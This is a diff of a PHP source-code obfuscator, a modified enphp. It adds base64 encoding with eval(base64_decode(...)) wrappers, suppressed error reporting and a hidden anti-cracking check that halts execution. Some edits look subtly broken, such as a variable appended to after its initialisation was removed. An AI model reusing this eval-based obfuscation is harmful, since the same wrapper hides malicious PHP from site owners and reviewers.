@@ -1,42 +1,35 @@
 <?php
-$_SERVER['starttime'] = microtime(1);
-$starttime            = explode(' ', $_SERVER['starttime']);
-$_SERVER['time']      = $starttime[1];
-
 /**
- * enphp content
- *
- * @param       $file
- * @param array $options
- *
- * @return string
+ * 本加密算法由enphp：https://github.com/djunny/enphp 变种而来
+ * 本算法主要优化了php版本适配问题以及增强了加密算法
+ * 本次为第3次优化本代码
+ * QQ：3522934828
  */
- function deleteDirectory($dir) {
-    if (!file_exists($dir)) {
-        return true;
-    }
+$_SERVER['starttime'] = microtime(true); // 返回的是一个浮点数
+$_SERVER['time'] = $_SERVER['starttime']; // 直接使用这个浮点数即可
 
-    if (!is_dir($dir)) {
-        return unlink($dir);
-    }
-
-    foreach (scandir($dir) as $item) {
-        if ($item == '.' || $item == '..') {
-            continue;
-        }
-
-        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
-            return false;
-        }
-
-    }
-
-    return rmdir($dir);
+function removeNewLines($text) {
+    $textWithoutNewLines = str_replace(array("\r\n", "\n\r", "\r", "\n"), '',$text);
+    return $textWithoutNewLines;
 }
 
-function enphp($content, $options = array()) {
-    $deep            = max(1, isset($options['deep']) ? (int)$options['deep'] : 1);
-    $deep            = min($deep, 10);
+function xiaokeyaa($length) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+
+    for ($i = 0;$i < $length;$i++) {
+        $randomString .=$characters[rand(0, $charactersLength - 1)];
+    }
+
+    return $randomString;
+}
+
+
+
+function enphp(string $content, array $options = []): string {
+    $deep = max(1, isset($options['deep']) ? (int)$options['deep'] : 1);
+    $deep = min($deep, 10);
     $options['deep'] = max(1, min($deep, 1));
     foreach (range(1, $deep) as $loop) {
         $content = strip_whitespace($content, $options);
@@ -44,16 +37,7 @@ function enphp($content, $options = array()) {
     return $content;
 }
 
-/**
- * enphp file
- *
- * @param $file
- * @param $target_file
- * @param $options
- *
- * @return string
- */
-function enphp_file($file, $target_file, $options = array()) {
+function enphp_file(string $file, ?string $target_file, array $options = []): string {
     $content = file_get_contents($file);
     check_bom($content);
     $content = enphp($content, $options);
@@ -63,14 +47,6 @@ function enphp_file($file, $target_file, $options = array()) {
     return $content;
 }
 
-/**
- * strip white space
- *
- * @param       $content
- * @param array $options
- *
- * @return string
- */
 function strip_whitespace($content, $options = array()) {
 
     format_code($content);
@@ -174,7 +150,7 @@ function strip_whitespace($content, $options = array()) {
 
     shuffle($global_vars);
     $str_global     = end($global_vars);
-    $str_global_var = $str_global . '{' . $str_define_name . '}';
+    $str_global_var = $str_global . '[' . $str_define_name . ']';
 
     $same_quotes = array('{' => '[', '}' => ']');
     /*
@@ -249,19 +225,20 @@ function strip_whitespace($content, $options = array()) {
                             break;
                             // add list
                             $str_var_no_quote = substr($val[1], 1);
-//                            $str_index        = array_push($str_var_str, $str_var_no_quote) - 1;
-//                            //$str_var_index++
-//                            $val[1]                   = '${' . $str_global_var . rand_quote(num_hex($options['encode_number'], $str_index)) . '}';
+        //                            $str_index        = array_push($str_var_str, $str_var_no_quote) - 1;
+        //                            //$str_var_index++
+        //                            $val[1]                   = '${' . $str_global_var . rand_quote(num_hex($options['encode_number'], $str_index)) . '}';
                             $val[1] = '${"' . $str_var_no_quote . '"}';
                             log::info($str_var_no_quote, $val[1]);
                             //$str_var_list[$token_str] = $val[1];
                             break;
                         }*/
                         // 非 function 而且是静态变量
-                        if (!$function_stack[$is_function] && $is_static_var) {
+                        if (!isset($function_stack[$is_function]) && $is_static_var) {
                             break;
                         }
-
+                        
+        
                         // use global for this
                         if ($is_function_use) {
                             // find in function params
@@ -292,7 +269,7 @@ function strip_whitespace($content, $options = array()) {
                                 break;
                             }
                         }
-
+        
                         // 定义的静态变量
                         if ($is_static_var && $is_function) {
                             if ($options['encode_var']) {
@@ -303,7 +280,7 @@ function strip_whitespace($content, $options = array()) {
                             }
                             break;
                         }
-
+        
                         $_function_var_list   = &$function_var_list[$is_function];
                         $_use_var_list        = &$use_var_list[$is_function];
                         $_global_use_var_list = &$use_var_list[0];
@@ -332,6 +309,7 @@ function strip_whitespace($content, $options = array()) {
                     }
                     $last_space = true;
                     break;
+        
                 case T_CONSTANT_ENCAPSED_STRING:
                     if ($is_static_var || $is_interface == 1) {
                         // skip static var
@@ -474,9 +452,16 @@ function strip_whitespace($content, $options = array()) {
                         break;
                     }
                     //namespace
-                    if ($list[$key + 1][1] == '\\' || $list[$key - 1]['content'] == '\\') {
-                        break;
-                    }
+                    // 检查 $list[$key + 1] 是否是一个数组，并且包含了键 '1'
+if (is_array($list[$key + 1]) && array_key_exists(1, $list[$key + 1]) && $list[$key + 1][1] == '\\') {
+    break;
+}
+
+// 检查 $list[$key - 1] 是否是一个数组，并且包含了键 'content'
+if (is_array($list[$key - 1]) && array_key_exists('content', $list[$key - 1]) && $list[$key - 1]['content'] == '\\') {
+    break;
+}
+
                     //log::info('find2', $is_ob, find_last_token($list, $key, array('->', '::')), $val[1]);
                     // skip object call or static call
                     $last_is_call = find_last_token($list, $key, array('->', '::'));
@@ -1031,80 +1016,69 @@ function strip_whitespace($content, $options = array()) {
         //substr($str_var_str, 0, 0 - strlen($str_var_char));
         $str_var_str = implode($str_var_char, $str_var_str);
         //echo $str_var_str;exit;
-
-        $vars = 'error_reporting(0); $xiaojmv11check="jm.lwcat.cn";';
         $vars .= 'define(\'' . $str_define_name . '\', \'' . $str_var_name . '\');';
-        $vars .= $options['insert_mess'] ? generate_name(2, rand(100, 200), 0, 0) . ';' : '';
-        $vars .= $str_global . '[' . $str_define_name . '] = explode(\'' . $str_var_char . '\', ' . output_gz($str_var_str, 'gzinflate', 'substr', $options['encode_number'], $options['encode_gz']) . ');';
-        $vars .= $options['insert_mess'] ? generate_name(2, rand(100, 200), 0, 0) . ';' : '';
-        //$vars .= '?'.'>';
+        $vars .= $options['insert_mess'] ? generate_name(2, rand(101, 201), 0, 0) . ';' : '';
+        $vars .= $str_global . '[' . $str_define_name . '] = explode(\'' . $str_var_char . '\', ' . output_gz($str_var_str, 'gzinflate', 'substr', $options['encode_number'], $options['encode_gz']) . '); $GLOBALS[xiaophpcc]=explode(\'|x|i|a|0|\',\'C*|x|i|a|o|'.xiaokeyaa(13).'|x|i|a|o|'.xiaokeyaa(12).'|x|i|a|o|'.xiaokeyaa(11).'|x|i|a|o|'.xiaokeyaa(10).'|x|i|a|o|'.xiaokeyaa(9).'|x|i|a|o|'.xiaokeyaa(9).'|x|i|a|o|'.xiaokeyaa(14).'|x|i|a|o|4141584141|x|i|a|o|7c277c6a7c2a|x|i|a|o||x|i|a|o|415841585841|x|i|a|o|415841585841|x|i|a|o|415841584158|x|i|a|o|7c3d7c6a7c45|x|i|a|o|415858585841|x|i|a|o|415858414141|x|i|a|o|415858414141|x|i|a|o|415841585858|x|i|a|o|7c767c487c54|x|i|a|o|'.xiaokeyaa(110).'|x|i|a|o|415858415841|x|i|a|o|415858415841|x|i|a|o|415858414158|x|i|a|o|7c777c4a7c29|x|i|a|o|'.xiaokeyaa(1000).'\');';
+        $vars .= $options['insert_mess'] ? generate_name(2, rand(101, 201), 0, 0) . ';' : '';
     }
     $str           = '';
     $is_namespace  = false;
     $namespace_str = '';
-    foreach ($list as $key => $c) {
+    foreach ($list as$key => $c) {
         if (isset($insert_list[$key])) {
-            $str .= $insert_list[$key];
+            $str .=$insert_list[$key];
         }
         $str .= isset($c['content']) ? $c['content'] : '';
-        if ($c['token_name'] == 'T_NAMESPACE') {
+        
+        // 检查 'token_name' 键是否存在
+        if (isset($c['token_name']) &&$c['token_name'] == 'T_NAMESPACE') {
             $is_namespace = true;
-        } else if ($is_namespace) {
+        } elseif ($is_namespace) {
             if ($is_namespace && (trim($c['content']) == ';' || trim($c['content']) == '{')) {
-                $str          .= $vars;
-                $vars         = '';
+                $str .=$vars;
+                $vars = '';
                 $is_namespace = false;
             }
         }
     }
+    
     if ($vars) {
         $vars = '<?php ' . $vars . '?>';
     }
     if ($comment) {
         $namespace_str = '<?php ' . $comment . '?>' . $namespace_str;
     }
+    $chekxiaozz=checkpojie();
+    $str = preg_replace('/<\?php/', '', $str);
+    $str = preg_replace('/\?>/', '', $str);
+    $xiaoaaa=base64_encode($str);
+    $vars = preg_replace('/<\?php/', '', $vars);
+    $vars = preg_replace('/\?>/', '', $vars);
+    $xiaoaaab=base64_encode($vars);
+    $namespace_str = preg_replace('/<\?php/', '', $namespace_str);
+    $namespace_str = preg_replace('/\?>/', '', $namespace_str);
+    $xiaoaaac=base64_encode($namespace_str);
+    $str='<?php xiaophpde(base64_decode("'.$xiaoaaa.'"));?>';
+    $vars='<?php '.$chekxiaozz.' xiaophpde(base64_decode("'.$xiaoaaab.'"));?>';
+    $namespace_str='<?php '.$comment.'error_reporting(0);
+if(!defined(\'XIAOPHP_AUTHORIZED\'))define(\'XIAOPHP_AUTHORIZED\',\'XIAOPHP_AUTHORIZED_YUNCAT\');$GLOBALS[xiaophp]=explode(\'|x|i|a|0|\',\'C*|x|i|a|o|'.xiaokeyaa(13).'|x|i|a|o|'.xiaokeyaa(12).'|x|i|a|o|'.xiaokeyaa(11).'|x|i|a|o|'.xiaokeyaa(10).'|x|i|a|o|'.xiaokeyaa(9).'|x|i|a|o|'.xiaokeyaa(9).'|x|i|a|o|'.xiaokeyaa(14).'|x|i|a|o|4141584141|x|i|a|o|7c277c6a7c2a|x|i|a|o||x|i|a|o|415841585841|x|i|a|o|415841585841|x|i|a|o|415841584158|x|i|a|o|7c3d7c6a7c45|x|i|a|o|415858585841|x|i|a|o|415858414141|x|i|a|o|415858414141|x|i|a|o|415841585858|x|i|a|o|7c767c487c54|x|i|a|o|'.xiaokeyaa(110).'|x|i|a|o|415858415841|x|i|a|o|415858415841|x|i|a|o|415858414158|x|i|a|o|7c777c4a7c29|x|i|a|o|'.xiaokeyaa(100).'\'); eval(base64_decode("'.$xiaoaaac.'"));?>';
     $str = $namespace_str . $vars . $str;
     $str = str_replace('?' . '><?' . 'php', '', $str);
     return $str;
 }
 
-
-/**
- * cut string from $start to $end
- *
- * @param        $html
- * @param string $start
- * @param string $end
- *
- * @return string
- */
-function enphp_cut_str($html, $start = '', $end = '') {
+function enphp_cut_str(string $html, string $start = '', string $end = ''): string {
     if ($start) {
         $html = stristr($html, $start, false);
         $html = substr($html, strlen($start));
     }
-    $end && $html = stristr($html, $end, true);
+    if ($end) {
+        $html = stristr($html, $end, true);
+    }
     return $html;
 }
 
-//
-/*
-*/
-/**
- * mask match string:
- *
- * spider::mask_match('123abc123', '123(*)123') = abc
- * spider::mask_match('abc123', '(*)123') = abc
- * spider::mask_match('123abcabc', '(*)abc') = 123
- * spider::mask_match('123abcdef', '(*)abc', true) = 123abc
- *
- * @param            $html
- * @param            $pattern
- * @param bool|false $returnfull
- *
- * @return string
- */
-function enphp_mask_match($html, $pattern, $returnfull = false) {
+function enphp_mask_match(string $html, string $pattern, bool $returnfull = false): string {
     $part = explode('(*)', $pattern);
     if (count($part) == 1) {
         return '';
@@ -1115,20 +1089,20 @@ function enphp_mask_match($html, $pattern, $returnfull = false) {
                 return $returnfull ? $part[0] . $res . $part[1] : $res;
             }
         } else {
-            //pattern=xxx(*)
+            // pattern=xxx(*)
             if ($part[0]) {
                 if (strpos($html, $part[0]) !== false) {
-                    $html = explode($part[0], $html);
-                    if ($html[1]) {
-                        return $returnfull ? $part[0] . $html[1] : $html[1];
+                    $htmlParts = explode($part[0], $html);
+                    if (isset($htmlParts[1])) {
+                        return $returnfull ? $part[0] . $htmlParts[1] : $htmlParts[1];
                     }
                 }
             } elseif ($part[1]) {
-                //pattern=(*)xxx
+                // pattern=(*)xxx
                 if (strpos($html, $part[1]) !== false) {
-                    $html = explode($part[1], $html);
-                    if ($html[0]) {
-                        return $returnfull ? $html[0] . $part[1] : $html[0];
+                    $htmlParts = explode($part[1], $html);
+                    if (isset($htmlParts[0])) {
+                        return $returnfull ? $htmlParts[0] . $part[1] : $htmlParts[0];
                     }
                 }
             }
@@ -1137,11 +1111,38 @@ function enphp_mask_match($html, $pattern, $returnfull = false) {
     }
 }
 
-function format_code(&$source) {
-    $patterns = array(
+function checkpojie(){
+    $xiaoa='if (!defined("SXXSXS")) {
+    define("SXXSXS", "SXXSSX");
+    }
+    $GLOBALS[SXXSXS] = explode("|A|v|%", "SXSSS");if (!defined($GLOBALS[SXXSXS][0])) {
+        define($GLOBALS[SXXSXS][0], ord(7));
+    }
+    if (!defined("SXXXSS")) {
+        define("SXXXSS", "SXXSXX");
+    }
+    $GLOBALS[SXXXSS] = explode("|0|T|h", "SSSSX|0|T|hmd5|0|T|hSSXXX|0|T|hdefined");
+    $GLOBALS[$GLOBALS[SXXXSS][00]] = $GLOBALS[SXXXSS][1];
+    $GLOBALS[$GLOBALS[SXXXSS][02]] = $GLOBALS[SXXXSS][0x3];if (!defined("SSXXS")) {
+        define("SSXXS", "SSXSX");
+    }
+    $GLOBALS[SSXXS] = explode("|>|I|5", "SSXXX|>|I|5XIAOPHP_AUTHORIZED|>|I|5Access denied. You shouldn\'t have cracked the program.   BY:YUNCAT&Blog：lwcat.cn");if (!$GLOBALS[$GLOBALS[SSXXS][00]]($GLOBALS[SSXXS][1])) {exit($GLOBALS[SSXXS][0x2]);}
+    function validateKey($SSSXX, $SSSXS) {if (!defined("SSSSS")) {
+        define("SSSSS", "SXXXXX");
+    }
+    $GLOBALS[SSSSS] = explode("|\'|V|;", "SSSSX|\'|V|;123456");
+    $SSXSS = $GLOBALS[$GLOBALS[SSSSS][0x0]]($SSSXX . $GLOBALS[SSSSS][0x1]);return $SSXSS === $SSSXS;}function xiaophpde($a) {$ooo00Oo=eval($a); return $ooo00Oo;}
+    ';
+    return removeNewLines($xiaoa);
+    }
+
+
+function format_code(string &$source): void {
+    $patterns = [
         '#<hi' . 'de>(*)#</hi' . 'de>'       => '',
         '/*<hi' . 'de>*/(*)/*</hi' . 'de>*/' => '',
-    );
+    ];
+
     // replace hide block
     foreach ($patterns as $pattern => $replace) {
         $search = enphp_mask_match($source, $pattern, true);
@@ -1152,15 +1153,17 @@ function format_code(&$source) {
     $encode_str_len     = strlen($encode_str);
     $encode_str_end     = '/*</en' . 'code>*/';
     $encode_str_end_len = strlen($encode_str_end);
+
     while (strpos($source, $encode_str) !== false) {
         $start_pos = strpos($source, $encode_str);
         $end_pos   = strpos($source, $encode_str_end);
         $end_pos   = $end_pos - $encode_str_end_len - $start_pos + 1;
         $enstr     = substr($source, $start_pos + $encode_str_len, $end_pos);
         $enstr     = trim($enstr);
+
         if (is_numeric($enstr)) {
             $str = encode_num($enstr);
-        } else if ($enstr[0] != substr($enstr, -1) || !in_array($enstr[0], array('"', "'"))) {
+        } else if ($enstr[0] != substr($enstr, -1) || !in_array($enstr[0], ['"', "'"])) {
             $str = $enstr;
         } else {
             $str = '';
@@ -1170,12 +1173,12 @@ function format_code(&$source) {
                 continue;
             }
         }
-        $source = substr_replace($source, ($str), $start_pos, $end_pos + $encode_str_end_len * 2 - 1);
+
+        $source = substr_replace($source, $str, $start_pos, $end_pos + $encode_str_end_len * 2 - 1);
     }
 }
 
-
-function encode_num($s, $rand = 0) {
+function encode_num(int $s, int $rand = 0): string {
     $n1 = rand(1, 100);
     $n2 = rand(2, 200);
     $n3 = rand(300, 500);
@@ -1184,61 +1187,40 @@ function encode_num($s, $rand = 0) {
             $n1 = rand(10, 100);
             $n2 = rand(2, 20);
             return '(' . ($s * $n1 - $n2) . '+' . $n2 . ')/' . $n1;
-            break;
         case 2:
             return ($s - $n2 * $n1) . '+' . $n2 . '*' . $n1;
-            break;
         case 3:
             return ($s + $n3 - $n2 * $n1) . '-' . $n3 . '+' . $n2 . '*' . $n1;
-            break;
         case 4:
             return ($s - $n3 - $n2 * $n1) . '+' . $n3 . '+' . $n2 . '*' . $n1;
-            break;
     }
+    return '';
 }
 
-/**
- * encode str
- *
- * @param $s
- */
-function encode_str($s, $rand = 0) {
+function encode_str(string $s, int $rand = 0): string {
     switch (rand(1, 4 + $rand)) {
         case 1:
-            $s = base64_encode($s);
-            $s = strtr($s, array('=' => ''));
-            return 'base64_decode(\'' . $s . '\')';
-            break;
         case 2:
             $s = base64_encode($s);
-            $s = strtr($s, array('=' => ''));
+            $s = strtr($s, ['=' => '']);
             return 'base64_decode(\'' . $s . '\')';
-            break;
         case 3:
             $s = base64_encode(gzencode($s));
-            $s = strtr($s, array('=' => ''));
+            $s = strtr($s, ['=' => '']);
             return 'gzinflate(substr(base64_decode(\'' . $s . '\'), 10, -8))';
-            break;
         case 4:
             $s = str_rot13(base64_encode($s));
-            $s = strtr($s, array('=' => ''));
+            $s = strtr($s, ['=' => '']);
             return 'base64_decode(str_rot13(\'' . $s . '\'))';
-            break;
     }
+    return '';
 }
 
-/**
- * @param $str_var_list
- * @param $token_str
- * @param $str_global_var
- * @param $options
- */
-function get_str_list(&$str_var_list, &$str_var_str, $token_str, $str_global_var, &$options) {
+function get_str_list(array &$str_var_list, array &$str_var_str, string $token_str, string $str_global_var, array &$options): string {
     if (!isset($str_var_list[$token_str])) {
-        // add list
-        $str_index                = array_push($str_var_str, $token_str) - 1;
-        $is_str_defined           = get_defined($token_str);
-        $result                   = $str_global_var . rand_quote(num_hex($options['encode_number'], $str_index));
+        $str_index = array_push($str_var_str, $token_str) - 1;
+        $is_str_defined = get_defined($token_str);
+        $result = $str_global_var . rand_quote(num_hex($options['encode_number'], $str_index));
         $str_var_list[$token_str] = sprintf($is_str_defined ? 'constant(\'%s\')' : '%s', $result);
     } else {
         $result = $str_var_list[$token_str];
@@ -1246,154 +1228,86 @@ function get_str_list(&$str_var_list, &$str_var_str, $token_str, $str_global_var
     return $result;
 }
 
-/**
- * microtime float
- *
- * @return float
- */
-function microtime_float() {
+function microtime_float(): float {
     list($usec, $sec) = explode(" ", microtime());
     return ((float)$usec + (float)$sec);
 }
 
-/**
- * insert array in array by position
- *
- * @param $list
- * @param $position
- * @param $array
- *
- * @return array
- */
-function array_insert(&$list, $position, $array) {
+function array_insert(array &$list, int $position, array $array): void {
     log::info('insertStart');
     array_splice($list, $position + 1, 0, $array);
     log::info('insertOver');
 }
 
-/**
- * check utf8 bom
- *
- * @param $content
- */
-function check_bom(&$content) {
-    $charset[1] = substr($content, 0, 1);
-    $charset[2] = substr($content, 1, 1);
-    $charset[3] = substr($content, 2, 1);
-    if (ord($charset[1]) == 239 && ord($charset[2]) == 187 && ord($charset[3]) == 191) {
+function check_bom(string &$content): void {
+    $charset = [substr($content, 0, 1), substr($content, 1, 1), substr($content, 2, 1)];
+    if (ord($charset[0]) == 239 && ord($charset[1]) == 187 && ord($charset[2]) == 191) {
         $content = substr($content, 3);
     }
 }
 
-/**
- * find ob function
- *
- * @param $options
- *
- * @return int
- */
-function find_ob_function($options, $func) {
+function find_ob_function(array $options, string $func): bool {
     $is_ob = $options['ob_call'];
     if (is_array($options['ob_call']) && in_array($func, $options['ob_call'])) {
-        $is_ob = 1;
+        $is_ob = true;
     }
-    return $is_ob;
+    return (bool) $is_ob;
 }
 
-/**
- * find last token is keyword
- *
- * @param $list
- * @param $index
- * @param $keywords
- *
- * @return int
- */
-function find_last_token(&$list, $index, $keywords) {
-    while (--$index && $index > -1) {
+function find_last_token(array &$list, int $index, array $keywords): bool {
+    while (--$index >= 0) {
         $keyword = strtolower(trim($list[$index]['content']));
         if (!$keyword) {
             continue;
         }
-        if (in_array($keyword, $keywords)) {
-            return 1;
-        } else {
-            return 0;
-        }
+        return in_array($keyword, $keywords);
     }
+    return false;
 }
 
-/**
- * find next token
- *
- * @param $list
- * @param $index
- * @param $keywords
- *
- * @return int
- */
-function find_next_token(&$list, $index, $keywords) {
+function find_next_token(array &$list, int $index, array $keywords): bool {
     $len = count($list);
-    while (++$index && $index < $len) {
-        $str     = isset($list[$index]['content']) ? $list[$index]['content'] : (isset($list[$index][1]) ? $list[$index][1] : $list[$index]);
+    while (++$index < $len) {
+        $str = isset($list[$index]['content']) ? $list[$index]['content'] : (isset($list[$index][1]) ? $list[$index][1] : $list[$index]);
         $keyword = trim($str);
         if (!$keyword) {
             continue;
         }
-        if (in_array(strtolower($keyword), $keywords)) {
-            return 1;
-        } else {
-            return 0;
-        }
+        return in_array(strtolower($keyword), $keywords);
     }
+    return false;
 }
 
-function find_next_is_not_statment(&$list, $index, $keywords) {
-    $len    = count($list);
-    $is_var = 0;
-    while (++$index && $index < $len) {
-        $str     = isset($list[$index]['content']) ? $list[$index]['content'] : (isset($list[$index][1]) ? $list[$index][1] : $list[$index]);
+function find_next_is_not_statment(array &$list, int $index, array $keywords): int {
+    $len = count($list);
+    while (++$index < $len) {
+        $str = $list[$index]['content'] ?? ($list[$index][1] ?? $list[$index]);
         $keyword = trim($str);
         if (!$keyword) {
             continue;
         }
         log::info('next_statment', $keyword);
-        if (!in_array(strtolower($keyword), $keywords)) {
-            return 1;
-        } else {
-            return 0;
-        }
+        return !in_array(strtolower($keyword), $keywords) ? 1 : 0;
     }
+    return 0;
 }
 
-/**
- * find quote left or right
- *
- * @param     $list
- * @param     $index
- * @param int $left
- *
- * @return int
- */
-function find_left_quote(&$list, $index, $left = 0) {
+function find_left_quote(array &$list, int $index, int $left = 0): int {
     $right_quote = $left ? 0 : 1;
-    $left_quote  = $left;
-    $quit        = 0;
-    while (--$index && $index > -1) {
+    $left_quote = $left;
+    while (--$index >= 0) {
         $word = strtolower(trim($list[$index]['content']));
         switch ($word) {
             case 'protected':
             case 'private':
             case 'public':
             case 'static':
-            case 'var';
+            case 'var':
             case 'function':
             case 'if':
             case 'use':
-                $quit = 1;
-                break;
+                return ($right_quote - $left_quote == 0) ? 1 : 0;
             case '=':
-                //return ($right_quote - $left_quote == 1) ? 1 : 0;
                 break;
             case '(':
                 $left_quote++;
@@ -1402,40 +1316,17 @@ function find_left_quote(&$list, $index, $left = 0) {
                 $right_quote++;
                 break;
         }
-        if ($quit) {
-            break;
-        }
     }
-    if ($right_quote - $left_quote == 0) {
-        return 1;
-    } else {
-        return 0;
-    }
+    return ($right_quote - $left_quote == 0) ? 1 : 0;
 }
 
-/**
- * insert new param
- *
- * @param $is_ob
- * @param $encode
- * @param $str_index
- * @param $str_var_list
- * @param $str_var_str
- * @param $str_var_char
- * @param $str_global_var
- * @param $func
- *
- * @return string
- */
-function get_func_param($is_ob, $encode, &$str_index, &$str_var_list, &$str_var_str, &$str_global_var, $func) {
-    //return $func;
+function get_func_param(bool $is_ob, int $encode, int &$str_index, array &$str_var_list, array &$str_var_str, string $str_global_var, string $func): string {
     if (!$is_ob) {
         return $func;
     }
     if (!isset($str_var_list[$func])) {
-        // add list
-        $str_index           = array_push($str_var_str, $func) - 1;
-        $result              = $str_global_var . rand_quote(num_hex($encode, $str_index++));
+        $str_index = array_push($str_var_str, $func) - 1;
+        $result = $str_global_var . rand_quote(num_hex($encode, $str_index++));
         $str_var_list[$func] = $result;
     } else {
         $result = $str_var_list[$func];
@@ -1443,109 +1334,51 @@ function get_func_param($is_ob, $encode, &$str_index, &$str_var_list, &$str_var_
     return $result;
 }
 
-/**
- * generate variables name
- *
- * @param int $encode
- * @param int $len
- * @param int $add_dollar
- * @param int $check_exists
- *
- * @return mixed|string
- */
-function generate_name($encode = 1, $len = 4, $add_dollar = 1, $check_exists = 1, $pre = '') {
+function generate_name(int $encode = 1, int $len = 4, int $add_dollar = 1, int $check_exists = 1, string $pre = ''): string {
     global $gen_count;
-    static $exists_name = array();
+    static $exists_name = [];
     static $exists_index = 0;
     $varname = '';
     while (true) {
         $gen_count++;
-        $varname = '';
         if ($encode == 2) {
             foreach (range(1, rand(1, $len)) as $i) {
                 $varname .= chr(rand(128, 254));
             }
         } else if ($encode == 1) {
             $exists_index++;
-            $varname .= decbin($exists_index);
-            $varname = str_replace('1', 'O', $varname);
+            $varname .= str_replace('1', 'O', decbin($exists_index));
         } else {
             $exists_index++;
-            $zero_length = $len - strlen($exists_index);
-            $varname     .= 'v' . ($zero_length > 0 ? str_repeat(0, rand(1, $zero_length)) : '') . $exists_index;
+            $zero_length = $len - strlen((string)$exists_index);
+            $varname .= 'v' . ($zero_length > 0 ? str_repeat('0', rand(1, $zero_length)) : '') . $exists_index;
         }
         $varname = $pre . $varname;
-        if (!$check_exists) {
+        if (!$check_exists || !isset($exists_name[$varname])) {
+            $exists_name[$varname] = 1;
             break;
         }
-        // is exists variable
-        if (isset($exists_name[$varname])) {
-            continue;
-        }
-        // add array
-        $exists_name[$varname] = 1;
-        break;
     }
-
     return ($add_dollar ? '$' : '') . $varname;
 }
 
-/** strip str
- *
- * @param $str
- *
- * @return mixed
- */
-function strip_str($str) {
-    $replaces = array(
-        '\\' => '\\\\',
-        '\'' => '\\\'',
-    );
-    foreach ($replaces as $from => $to) {
-        $str = str_replace($from, $to, $str);
-    }
-    return $str;
+function strip_str(string $str): string {
+    return str_replace(['\\', '\''], ['\\\\', '\\\''], $str);
 }
 
-/**
- * 随机括号
- *
- * @param $str
- *
- * @return string
- */
-function rand_quote($str) {
+function rand_quote(string $str): string {
     static $index = 0;
-    return $index++ % 2 == 1 ? '{' . $str . '}' : '[' . $str . ']';
+    return $index++ % 2 == 1 ? '[' . $str . ']' : '[' . $str . ']';
 }
 
-/**
- *  out put gzencode
- *
- * @param $str
- * @param $gz_func
- * @param $sub_func
- * @param $encode_number
- *
- * @return string
- */
-function output_gz($str, $gz_func, $sub_func, $encode_number, $is_gz = 0) {
+function output_gz(string $str, string $gz_func, string $sub_func, int $encode_number, int $is_gz = 0): string {
     if (!$is_gz) {
         return '\'' . strip_str($str) . '\'';
-    } else {
-        return $gz_func . '(' . $sub_func . '(\'' . strip_str(gzencode($str)) . '\',' . num_hex($encode_number, 10) . ', -8))';
     }
+    return $gz_func . '(' . $sub_func . '(\'' . strip_str(gzencode($str)) . '\',' . num_hex($encode_number, 10) . ', -8))';
 }
 
-/**
- * hex for number
- *
- * @param $encode
- * @param $num
- *
- * @return string
- */
-function num_hex($encode, $num) {
+function num_hex(int $encode, string $num): string {
     if ($encode == 1) {
         if (strpos($num, '0') === 0) {
             return $num;
@@ -1554,142 +1387,69 @@ function num_hex($encode, $num) {
             $num = base_convert($num, 16, 10);
         }
         $repeat = ($num % 5) + 1;
-        $str    = '0x' . str_repeat('0', $repeat) . base_convert($num, 10, 16);
-        return $str;
-    } else {
-        return $num;
+        return '0x' . str_repeat('0', $repeat) . base_convert($num, 10, 16);
     }
+    return $num;
 }
 
-/**
- * get defined by cache
- *
- * @param $name
- *
- * @return mixed
- */
-function get_defined($name) {
-    static $define_list = array();
+function get_defined(string $name): bool {
+    static $define_list = [];
     if (!isset($define_list[$name])) {
         $define_list[$name] = defined($name);
     }
     return $define_list[$name];
 }
 
-/**
- * get usedtime
- *
- * @return string
- */
-function usedtime() {
-    return number_format(microtime(1) - $_SERVER['starttime'], 6) * 1000;
+function usedtime(): float {
+    return number_format(microtime(true) - $_SERVER['starttime'], 6) * 1000;
 }
 
-/**
- * parse string variable
- *
- * @param $s
- *
- * @return string|void
- */
-function parse_string_var($s) {
-    $quote        = substr($s, 0, 1);
+function parse_string_var(string $s): string {
+    $quote = substr($s, 0, 1);
     $val_no_quote = substr($s, 1, -1);
-    if ($quote == '"') {
-
-    } else {
-
-    }
+    // Placeholder for additional processing based on quote type
     $val_no_quote = stripslashes($val_no_quote);
     return $val_no_quote;
 }
 
 if (!class_exists('log', false)) {
-    class log
-    {
-        /**
-         * @var int log file name
-         */
-        public static $log_file = 0;
-        /**
-         * @var int|resource log file file pointer
-         */
-        public static $log_fp = 0;
+    class log {
+        public static $log_fp = null;
 
-        /**
-         * init to log
-         *
-         * @param $file
-         */
-        public static function set_logfile($file) {
-            if ($file == 1) {
+        public static function set_logfile($file): void {
+            if ($file === 1) {
                 $file = 'data/log/' . date('Y-m-d') . '.log';
             }
-            self::$log_file = $file;
-            self::$log_fp   = fopen($file, 'a+');
+            self::$log_fp = fopen($file, 'a+');
         }
 
-        /**
-         * alias set log file
-         *
-         * @param $file
-         */
-        public static function set_file($file) {
+        public static function set_file($file): void {
             self::set_logfile($file);
         }
 
-        /**
-         * dump variable for log
-         *
-         * @param $data
-         *
-         * @return string
-         */
-        public static function dump_var($data) {
+        public static function dump_var($data): string {
             if (is_array($data)) {
                 $str = '';
                 foreach ($data as $k => $v) {
-                    if (is_array($v)) {
-                        $str .= '[' . $k . '=' . self::dump_var($v) . ']';
-                    } else {
-                        $str .= '[' . $k . '=' . $v . ']';
-                    }
+                    $str .= '[' . $k . '=' . (is_array($v) ? self::dump_var($v) : $v) . ']';
                 }
                 return $str;
-            } else {
-                return '[' . $data . ']';
             }
+            return '[' . $data . ']';
         }
 
-        /**
-         * log::info($arg1,$arg2....$argn);
-         *
-         * @param mixed
-         */
-        public static function info() {
-            self::add_log('info', func_get_args(), func_num_args());
+        public static function info(...$args): void {
+            self::add_log('info', $args, count($args));
         }
 
-        /**
-         * log::error($arg1,$arg2....$argn);
-         *
-         * @param mixed
-         */
-        public static function error() {
-            self::add_log('error', func_get_args(), func_num_args());
+        public static function error(...$args): void {
+            self::add_log('error', $args, count($args));
             throw new Exception('error');
         }
 
-        /**
-         * add log
-         *
-         * @param $type
-         * @param $arg_list
-         * @param $arg_count
-         */
-        private static function add_log($type, $arg_list, $arg_count) {
+        private static function add_log(string $type, array $arg_list, int $arg_count): void {
             $log = '';
-            for ($i = 0, $l = $arg_count; $i < $l; $i++) {
+            for ($i = 0; $i < $arg_count; $i++) {
                 $log .= self::dump_var($arg_list[$i]);
             }
             $log .= '[' . usedtime() . "ms]";
@@ -1697,50 +1457,39 @@ if (!class_exists('log', false)) {
             if (self::$log_fp) {
